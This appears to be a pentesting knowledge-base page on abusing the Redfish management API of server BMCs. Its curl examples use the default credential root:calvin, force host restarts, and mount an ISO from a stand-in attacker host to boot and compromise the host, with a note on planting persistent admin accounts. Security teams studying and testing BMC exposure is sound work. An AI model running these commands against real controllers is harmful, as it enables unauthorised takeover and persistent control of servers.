---
title: "Redfish API: abusing the modern BMC REST API"
order: 5
description: "Redfish is the standardised REST API that modern BMCs expose for management. Reached with default or recovered credentials (or an auth flaw), it reads hardware inventory and controls the host: power state, boot device, BMC accounts, and virtual media. It is the clean, scriptable path to the same host-compromising control as legacy IPMI."
keywords:
  - redfish
  - rest api
  - bmc
  - virtual media
  - power control
---

# Redfish API

Redfish is the DMTF-standardised REST/JSON API that modern BMCs (iDRAC, iLO, Supermicro, OpenBMC) expose over HTTPS, intended to replace the legacy IPMI interface. For an attacker it is the clean, scriptable control plane: authenticated with default or recovered credentials (or reached via an authentication flaw), it reads full hardware inventory and performs the host-compromising operations, querying and changing power state, setting the one-time boot device, creating and modifying BMC accounts, and attaching virtual media. It delivers the same impact as the IPMI attacks through a well-documented API, which makes it convenient for enumeration and automation across many controllers.

```bash
# unauthenticated service root reveals structure/version
curl -sk https://<bmc>/redfish/v1/
# authenticate (default/recovered creds) and enumerate
curl -sk -u root:calvin https://<bmc>/redfish/v1/Systems/
# control the host: power and one-time boot
curl -sk -u root:calvin -X POST https://<bmc>/redfish/v1/Systems/System.Embedded.1/Actions/ComputerSystem.Reset \
  -H 'Content-Type: application/json' -d '{"ResetType":"ForceRestart"}'
# attach virtual media (mount an attacker ISO) and boot from it
curl -sk -u root:calvin -X POST https://<bmc>/redfish/v1/Managers/.../VirtualMedia/CD/Actions/VirtualMedia.InsertMedia \
  -d '{"Image":"http://attacker/evil.iso"}'
# create a persistent admin BMC account via the Accounts collection
```

## Exploitation notes

- Redfish is the scriptable equivalent of the IPMI/vendor attacks: with credentials it reads inventory and drives power, boot, accounts, and virtual media across controllers uniformly, ideal for fleet-wide automation.
- The highest-impact action is the same as elsewhere, attach attacker virtual media and set a one-time boot to compromise the host OS; power/boot control and account creation support that and persistence.
- Credentials come from [defaults](bmc-default-credentials.md), [cracked RAKP hashes](ipmi-rakp-hash-disclosure.md), or a controller [exploit](idrac-and-ilo.md); some Redfish implementations have also had their own authentication-bypass flaws, so test the service root and version.
- The unauthenticated `/redfish/v1/` root leaks structure and firmware version for fingerprinting even before credentials.

## References

- [DMTF Redfish specification](https://www.dmtf.org/standards/redfish)
- [HackTricks: Redfish/BMC](https://book.hacktricks.xyz/network-services-pentesting/623-udp-ipmi)
